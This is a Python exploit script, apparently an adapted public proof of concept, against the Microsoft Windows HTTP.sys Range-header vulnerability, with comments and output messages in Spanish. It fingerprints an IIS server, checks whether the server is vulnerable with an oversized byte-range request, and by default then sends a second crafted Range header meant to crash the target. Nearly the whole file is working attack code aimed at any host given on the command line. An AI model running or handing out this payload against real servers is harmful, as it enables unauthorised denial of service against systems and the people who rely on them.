# written by john.b.hale@gmail.com - 2015-04-15
# args added and reformated by Juan Cruz Tommasi - b4sec - 13/04/2020
# usage for poc: python xploit.py -t <hostAddr> -p <port>
# exploiting usage: python xploit.py -t <hostAddr> -p <port> --exploit

import socket
import random
from argparse import ArgumentParser

parser = ArgumentParser(description='Microsoft Windows - HTTP.sys - DoS')
parser.add_argument('-t', '--targethost', type=str, metavar='',required=True, help='Remote Host')
parser.add_argument('-p', '--port', type=int, metavar='', required=True, help='Remote Port')
parser.add_argument('--exploit', type=int, default=1, required=False, help='Shutdown server')
args = parser.parse_args()

ipAddr = args.targethost
port = args.port
hexAllFfff = b'18446744073709551615'

req1 = b'GET / HTTP/1.0\r\n\r\n'
req = b'GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-' + hexAllFfff + b'\r\n\r\n'
xploit = b'GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=18-' + hexAllFfff + b'\r\n\r\n'

print('[*] Testeando la vulnerabilidad.. ')
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, port))
client_socket.send(req1)
boringResp = client_socket.recv(1024)
if b'Microsoft' not in boringResp:
                print('[*] El objetivo no es IIS')
                exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, 80))
client_socket.send(req)
goodResp = client_socket.recv(1024)
if b'Requested Range Not Satisfiable' in goodResp:
                print('[!!] El host parece Vulnerable a DoS')
                if args.exploit:
                    print('[*] Lanzando ataque de denegacion de servicio al servidor: ' + args.targethost)
                    client_socket.send(xploit)
                    print('[!!] Payload enviado')
elif b' The request has an invalid header name' in goodResp:
                print('[*] Parece que no es vulnerable .. :(')
else:
                print('[*] Respuesta desconocida, no podemos identificar si es vulnerable')
